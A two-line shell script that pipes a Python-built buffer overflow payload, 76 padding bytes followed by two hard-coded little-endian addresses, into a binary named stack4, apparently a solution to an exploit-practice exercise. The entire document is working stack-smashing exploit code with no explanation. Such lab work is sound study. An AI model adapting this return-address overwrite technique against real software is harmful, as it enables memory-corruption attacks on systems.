#! /bin/sh
python -c "print 'A'*76+'\x3b\x84\x04\x08'+'\xd0\x39\xe3\xf7'" | ./stack4
